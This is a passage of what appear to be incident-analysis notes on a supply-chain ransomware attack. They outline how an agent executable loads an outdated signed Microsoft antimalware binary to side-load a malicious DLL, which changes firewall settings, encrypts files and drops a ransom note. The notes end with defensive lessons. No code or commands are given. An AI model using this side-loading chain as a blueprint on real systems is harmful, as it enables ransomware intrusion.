- AGENT.EXE starts downloading the ransomware

### AGENT.EXE
- Loads MSMPENG.EXE, an outdated and expired version of Microsoft's antimalware service executable
- AGENT.EXE dropped a malicious file named MPSVC.DLL in the same directory as the file
- We are now running as a signed process

### MPSVC.DLL
- Deletes the file (now that it is in memory)
- Start encrypting all of your files, acted as it's own file service
- Executes a NetShell (NetSh) command to change firewall settings to allow the local Windows System to be discovered on the local network by other computers
- Starts encrypting the disk
- Creates ransom note

## Lessons Learned
- Your defensive tools can be used for Evil
- Criticality of Supply Chain
- Use of Zero days
- Use of Microsoft Signed Executable
